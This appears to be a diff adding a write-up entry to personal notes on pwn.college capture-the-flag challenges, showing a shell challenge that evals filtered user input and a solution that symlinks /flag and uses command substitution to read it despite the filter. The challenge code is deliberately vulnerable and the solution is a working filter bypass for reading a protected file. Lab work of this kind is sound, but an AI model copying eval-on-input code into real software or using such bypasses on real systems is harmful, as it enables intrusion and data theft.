@@ -40,3 +40,21 @@ $(< ${_}) is a command substitution that reads the contents of the file whose pa
 ```
 ### vuln
 directly executing clients ipnut
+
+# Odyssey of the Octal
+### chal
+``` sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+
+read INPUT < <(head -n1 | tr -d "[A-Za-z0-9./]")
+eval "$INPUT"
+```
+### sol
+``` sh
+ln -s /flag IPNUT
+```
+``` sh
+$(< ${_})
+```
